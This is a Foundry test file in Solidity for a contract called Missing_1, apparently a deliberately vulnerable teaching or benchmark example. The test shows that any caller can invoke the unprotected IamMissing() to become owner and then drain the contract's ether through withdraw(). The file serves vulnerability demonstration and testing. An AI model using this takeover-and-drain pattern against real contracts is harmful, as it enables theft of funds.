
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Missing_1} from "../src/Missing_1.sol";

contract TestAccessControlMissing_1 is Test {

    Missing_1 public _contractUnderTest;

    function setUp() public {
        _contractUnderTest = new Missing_1();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        
        // --- 1. Constraints ---
        // Caller cannot be the test contract itself.
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));

        // Exclude Foundry Internals (Dynamic)
        vm.assume(caller != address(vm)); 
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);

        // --- 2. State Configuration ---
        // Fund the contract so we can verify the attacker can drain it
        vm.deal(address(_contractUnderTest), 10 ether);
        
        // Store the initial balance of the caller
        uint256 callerInitialBalance = caller.balance;

        // --- 3. Execution & Assertion ---
        
        // Switch context to the arbitrary caller
        vm.startPrank(caller);

        // TRIGGER VULNERABILITY: Call IamMissing to become owner
        // This function lacks access control - anyone can call it and become owner
        _contractUnderTest.IamMissing();

        // Now the caller is the owner, they can withdraw all funds
        _contractUnderTest.withdraw();

        vm.stopPrank();

        // ASSERT SUCCESS: Verify the caller successfully drained the contract
        assertEq(address(_contractUnderTest).balance, 0, "Contract should be drained");
        assertEq(caller.balance, callerInitialBalance + 10 ether, "Caller should have received the funds");
    }
}
